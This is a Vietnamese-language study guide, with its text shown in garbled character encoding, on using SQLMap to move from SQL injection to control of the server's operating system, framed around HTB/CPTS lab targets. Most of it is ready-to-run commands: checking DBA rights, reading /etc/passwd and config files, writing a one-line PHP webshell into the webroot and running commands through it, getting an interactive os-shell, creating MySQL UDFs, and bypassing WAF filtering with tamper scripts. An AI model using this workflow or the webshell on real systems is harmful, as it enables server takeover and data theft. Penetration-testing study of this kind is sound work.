# SQLMap OS Exploitation â€” TÃ i Liá»‡u NÃ¢ng Cao

## ğŸ“˜ Má»¥c Lá»¥c

* [1. Giá»›i thiá»‡u](#1-giá»›i-thiá»‡u)
* [2. Äiá»u kiá»‡n & NguyÃªn lÃ½ hoáº¡t Ä‘á»™ng](#2-Ä‘iá»u-kiá»‡n--nguyÃªn-lÃ½-hoáº¡t-Ä‘á»™ng)
* [3. Kiá»ƒm tra quyá»n DBA](#3-kiá»ƒm-tra-quyá»n-dba)
* [4. Äá»c file tá»« server](#4-Ä‘á»c-file-tá»«-server-file-read)
* [5. Ghi file lÃªn server â€” Upload Webshell](#5-ghi-file-lÃªn-server-upload-webshell)
* [6. OS Shell tá»± Ä‘á»™ng](#6-os-shell-tá»±-Ä‘á»™ng-os-shell)
* [7. Troubleshooting](#7-troubleshooting-khi-os-shell-tháº¥t-báº¡i)
* [8. Workflow thá»±c chiáº¿n](#8-workflow-thá»±c-chiáº¿n-os-exploitation)
* [9. CÃ¡c lá»‡nh quan trá»ng](#9-cÃ¡c-lá»‡nh-quan-trá»ng)
* [10. Ghi nhá»› quan trá»ng](#10-ghi-nhá»›-quan-trá»ng)
* [11. Flowchart OS Exploitation](#11-flowchart-os-exploitation)
* [12. VÃ­ dá»¥ thá»±c chiáº¿n HTB/CPTS](#12-vÃ­-dá»¥-thá»±c-chiáº¿n-htbcpts)

## 1. Giá»›i thiá»‡u

SQLMap khÃ´ng chá»‰ dÃ¹ng Ä‘á»ƒ khai thÃ¡c SQL Injection á»Ÿ má»©c database, mÃ  cÃ²n cÃ³ kháº£ nÄƒng khai thÃ¡c sÃ¢u vÃ o **há»‡ Ä‘iá»u hÃ nh (OS Exploitation)** náº¿u DBMS user cÃ³ quyá»n phÃ¹ há»£p. Äiá»u nÃ y cho phÃ©p:

* Äá»c file tá»« há»‡ thá»‘ng server
* Ghi file lÃªn server (vÃ­ dá»¥ upload webshell)
* Láº¥y OS shell tÆ°Æ¡ng tÃ¡c thÃ´ng qua SQLMap

---

## 2. Äiá»u kiá»‡n & NguyÃªn lÃ½ hoáº¡t Ä‘á»™ng

### 2.1. Äá»c file

Äá»ƒ Ä‘á»c file, DBMS cáº§n quyá»n nháº¥t Ä‘á»‹nh (tuá»³ DBMS). VÃ­ dá»¥ vá»›i MySQL:

* `LOAD DATA`
* `INSERT`

KhÃ´ng cáº§n DBA nhÆ°ng nhiá»u DBMS hiá»‡n nay siáº¿t quyá»n máº¡nh hÆ¡n.

### 2.2. Ghi file (nguy hiá»ƒm nháº¥t)

Ghi file lÃªn server cho phÃ©p upload webshell â†’ chiáº¿m quyá»n Ä‘iá»u khiá»ƒn server.
Vá»›i MySQL cáº§n:

* VÃ´ hiá»‡u `secure-file-priv`
* Quyá»n ghi vÃ o thÆ° má»¥c webroot

---

## 3. Kiá»ƒm tra quyá»n DBA

```bash
sqlmap -u "http://target/?id=1" --is-dba
```

Káº¿t quáº£:

* `current user is DBA: True` â†’ cÃ³ thá»ƒ Ä‘á»c/ghi file, os-shell.
* `False` â†’ quyá»n háº¡n cháº¿.

---

## 4. Äá»c file tá»« server: `--file-read`

```bash
sqlmap -u "http://target/?id=1" --file-read="/etc/passwd"
```

SQLMap sáº½ táº£i file vá» thÆ° má»¥c output tÆ°Æ¡ng á»©ng.

á»¨ng dá»¥ng:

* Äá»c config
* Äá»c source code
* Recon há»‡ thá»‘ng

---

## 5. Ghi file lÃªn server: Upload Webshell

### 5.1. Táº¡o shell PHP

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### 5.2. Upload

```bash
sqlmap -u "http://target/?id=1" \
  --file-write=shell.php \
  --file-dest="/var/www/html/shell.php"
```

### 5.3. Kiá»ƒm tra

```bash
curl http://target/shell.php?cmd=id
```

---

## 6. OS Shell tá»± Ä‘á»™ng: `--os-shell`

SQLMap sáº½:

* Kiá»ƒm tra loáº¡i webserver (PHP/ASP/JSP)
* TÃ¬m webroot
* Upload stager + backdoor
* Táº¡o UDF (MySQL) náº¿u cáº§n
* Tráº£ vá» interactive shell

### VÃ­ dá»¥:

```bash
sqlmap -u "http://target/?id=1" --os-shell
```

Náº¿u UNION-based tráº£ vá» `No output` â†’ Ä‘á»•i ká»¹ thuáº­t:

```bash
sqlmap -u "http://target/?id=1" --os-shell --technique=E
```

---

## 7. Troubleshooting khi OS-shell tháº¥t báº¡i

* KhÃ´ng cÃ³ quyá»n ghi file
* `secure-file-priv` cháº·n
* UNION-based bá»‹ giá»›i háº¡n output
* Webserver khÃ´ng cÃ³ quyá»n ghi webroot
* KhÃ´ng táº¡o Ä‘Æ°á»£c UDF

Giáº£i phÃ¡p:

* DÃ¹ng `--technique=E`
* Thá»­ `--no-cast` hoáº·c `--hex`
* Chá»‰ Ä‘á»‹nh custom writable path

---

## 8. Workflow thá»±c chiáº¿n OS Exploitation

### **B1: Kiá»ƒm tra quyá»n DBA**

```
--is-dba
```

### **B2: Äá»c file Ä‘á»ƒ recon**

```
--file-read=/etc/passwd
```

### **B3: Upload Webshell**

```
--file-write=shell.php --file-dest=/var/www/html/shell.php
```

### **B4: Kiá»ƒm tra shell**

```
curl http://target/shell.php?cmd=ls
```

### **B5: Láº¥y OS shell tá»± Ä‘á»™ng**

```
--os-shell
```

### **B6: Náº¿u fail â†’ Ä‘á»•i ká»¹ thuáº­t**

```
--technique=E
```

---

## 9. CÃ¡c lá»‡nh quan trá»ng

| Má»¥c Ä‘Ã­ch                 | Lá»‡nh                           |
| ------------------------ | ------------------------------ |
| Kiá»ƒm tra quyá»n DBA       | `--is-dba`                     |
| Äá»c file                 | `--file-read="/path"`          |
| Ghi file                 | `--file-write` + `--file-dest` |
| Láº¥y OS shell             | `--os-shell`                   |
| Thá»­ ká»¹ thuáº­t Error-based | `--technique=E`                |
| Auto mode                | `--batch`                      |

---

## 10. Ghi nhá»› quan trá»ng

* CÃ³ quyá»n ghi file â†’ kháº£ nÄƒng cao chiáº¿m server.
* Error-based (`E`) luÃ´n á»•n Ä‘á»‹nh hÆ¡n UNION cho OS-shell.
* `--file-write` lÃ  chá»©c nÄƒng thá»±c chiáº¿n cá»±c máº¡nh.
* `--batch` giÃºp tá»± Ä‘á»™ng hoÃ¡ hoÃ n toÃ n.

---

## 11. Flowchart OS Exploitation

```text
              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
              â”‚   Báº¯t Ä‘áº§u khai thÃ¡c SQLi     â”‚
              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â”‚
                  sqlmap --is-dba ?
                              â”‚
              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
              â”‚                              â”‚
         KhÃ´ng pháº£i DBA                LÃ  DBA (True)
              â”‚                              â”‚
    â†’ Háº¡n cháº¿ OS exploit          â†’ Tiáº¿p tá»¥c kiá»ƒm tra
              â”‚                              â”‚
                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                              â”‚ Kiá»ƒm tra file-read          â”‚
                              â”‚ sqlmap --file-read          â”‚
                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                             â”‚
                              Äá»c file thÃ nh cÃ´ng?
                                             â”‚
                 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                 â”‚                                                       â”‚
         KhÃ´ng â†’ chuyá»ƒn sang recon DB                          CÃ³ â†’ Tiáº¿p tá»¥c
                 â”‚                                                       â”‚
                                             â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                                             â”‚ Upload Webshell                         â”‚
                                             â”‚ --file-write + --file-dest              â”‚
                                             â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                                                         â”‚
                                                        Webshell hoáº¡t Ä‘á»™ng?
                                                                         â”‚
                                         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                                         â”‚                                                         â”‚
                             KhÃ´ng â†’ thá»­ Ä‘Æ°á»ng dáº«n khÃ¡c, bypass â†’ loop            CÃ³ â†’ Tiáº¿p tá»¥c
                                         â”‚                                                         â”‚
                                                        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                                                        â”‚ sqlmap --os-shell                                    â”‚
                                                        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 12. VÃ­ dá»¥ thá»±c chiáº¿n HTB/CPTS

### ğŸ”¥ **Case 1: MySQL + Error-based + Upload Webshell**

**Bá»‘i cáº£nh:** Web vulnerable parameter `id=1`. DB user lÃ  `dbadmin`, cÃ³ quyá»n ghi file.

**BÆ°á»›c 1 â€“ Kiá»ƒm tra quyá»n DBA:**

```bash
sqlmap -u "http://forge.htb/product.php?id=1" --is-dba
```

**Káº¿t quáº£:** `True`

**BÆ°á»›c 2 â€“ Äá»c file Ä‘á»ƒ recon:**

```bash
sqlmap -u URL --file-read="/etc/passwd"
```

PhÃ¡t hiá»‡n user `www-data` vÃ  cáº¥u trÃºc OS.

**BÆ°á»›c 3 â€“ Upload webshell:**

```bash
sqlmap -u URL --file-write=shell.php --file-dest=/var/www/html/shell.php
```

**BÆ°á»›c 4 â€“ RCE:**

```bash
curl http://target/shell.php?cmd=whoami
```

Tráº£ vá»: `www-data`

**BÆ°á»›c 5 â€“ OS Shell tá»± Ä‘á»™ng:**

```bash
sqlmap -u URL --os-shell --technique=E
```

Nháº­n shell: `os-shell>`

---

### ğŸ”¥ **Case 2: MySQL khÃ´ng ghi file Ä‘Æ°á»£c â†’ dÃ¹ng UDF Ä‘á»ƒ thá»±c thi lá»‡nh**

**Bá»‘i cáº£nh:** DB user khÃ´ng ghi file vÃ o webroot, nhÆ°ng cÃ³ quyá»n táº¡o UDF.

**Lá»‡nh:**

```bash
sqlmap -u "http://academy.htb/?id=5" --os-shell
```

SQLMap táº¡o UDF:

* `sys_exec`
* `sys_eval`

â†’ Cho phÃ©p cháº¡y lá»‡nh nhÆ°:

```
os-shell> id
```

---

### ğŸ”¥ **Case 3: WAF cháº·n UNION â†’ dÃ¹ng Error-based hoÃ n toÃ n**

```bash
sqlmap -u URL --os-shell --technique=E --tamper=between --batch
```

DÃ¹ng tamper Ä‘á»ƒ bypass lá»c keyword, error-based Ä‘á»ƒ láº¥y output.

---

**TÃ i liá»‡u Ä‘Ã£ Ä‘Æ°á»£c nÃ¢ng cáº¥p vá»›i TOC, flowchart, vÃ­ dá»¥ thá»±c chiáº¿n vÃ  ná»™i dung nÃ¢ng cao.**
